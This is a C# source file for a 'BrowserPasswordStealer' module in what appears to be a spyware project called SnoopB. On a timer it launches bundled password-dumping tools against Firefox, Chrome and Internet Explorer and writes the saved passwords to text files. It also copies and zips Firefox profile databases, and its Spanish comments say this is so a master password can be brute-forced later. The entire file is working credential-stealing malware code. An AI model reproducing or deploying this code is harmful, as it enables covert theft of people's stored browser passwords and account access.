using System;
using System.Collections.Generic;
using System.IO;
using System.Reflection;
using Ionic.Zip;
using SnoopB.Configuration;
using SnoopB.Resources;

namespace SnoopB.Modules.BrowserPasswordStealer
{ 
    //Using external resources, save the browser password, in each execution
    internal class BrowserPasswordStealerModule : Module
    {
        private const string firefoxFile = "PasswordFox.exe";
        private const string chromeFile = "ChromePass.exe";
        private const string ieFile = "iepv.exe";

        public BrowserPasswordStealerModule(int minutesInterval): base(minutesInterval)
        {

        }

        #region [ Module ]

        public new static string ModuleId
        {
            get { return "489a2dcf-0209-4d99-9a8a-9e28c16b4425"; }
        }

        protected override void ExecuteInternal()
        {
            StealPasswordsBrowser();
        }

        #endregion

        private void StealPasswordsBrowser()
        {
            //Creamos los archivos txt de los pass
            InvokeForBrowser(firefoxFile);

            InvokeForBrowser(chromeFile);

            InvokeForBrowser(ieFile);

            //Copiamos la db de firefox de pass para desencriptarla x fuerza bruta en caso de que tenga master password
            CopyFirefoxPasswords();
        }

        private void InvokeForBrowser(string browser)
        {
            var dest = ResourceManager.ExtractResource(browser);

            if(string.IsNullOrEmpty(dest))
                return;

            InitProcess(dest);
        }

        private void InitProcess(string exePath)
        {
            var param = string.Format(" /stext {0}\\{1}-{2}.txt", Configurator.Instance.CurrentExecutionPath, Path.GetFileNameWithoutExtension(exePath), DateTime.Now.ToString("dd-MM-yyyy--HH-mm-ss"));

            System.Diagnostics.Process.Start(exePath, param);
        }

        private void CopyFirefoxPasswords()
        {
            var currentLocation = Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location);
            var firefoxDbFolder = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Mozilla");
            firefoxDbFolder = Path.Combine(firefoxDbFolder, "Firefox");
            firefoxDbFolder = Path.Combine(firefoxDbFolder, "Profiles");

            var noOk = string.IsNullOrEmpty(ResourceManager.ExtractIonicZipResource());
            if (noOk)
                return;

            //Iteramos cada profile
            foreach (var s in Directory.GetDirectories(firefoxDbFolder))
            {
                //Por cada profile en el path actual creamos una carpeta con ese nombre
                var folderProfileName = Path.GetFileName(s) + "-" + DateTime.Now.ToString("dd-MM-yy-hh-mm-ss");
                var profileNuevo = Path.Combine(currentLocation, folderProfileName);
                Directory.CreateDirectory(profileNuevo);

                //Ahora copiamos archivos *.db
                foreach (var dbFile in Directory.GetFiles(s, "*.db"))
                    File.Copy(dbFile, Path.Combine(profileNuevo, Path.GetFileName(dbFile)), true);

                //Ahora copiamos archivos *.sqlite
                foreach (var dbFile in Directory.GetFiles(s, "*.sqlite"))
                    File.Copy(dbFile, Path.Combine(profileNuevo, Path.GetFileName(dbFile)), true);

                //Comprimimos la carpeta y borramos los archivos
                var zipFullPath = Path.Combine(currentLocation, folderProfileName + ".zip");
                var borrar = new List<string>();
                using (var zip = new ZipFile())
                {
                    foreach (var f in Directory.GetFiles(profileNuevo))
                    {
                        zip.AddFile(f, string.Empty);
                        borrar.Add(f);
                    }

                    zip.Save(zipFullPath);
                }

                //Borramos los archivos
                foreach (var f in borrar)
                    File.Delete(f);

                //Borramos la carpeta
                Directory.Delete(profileNuevo);
            }
        }
    }
}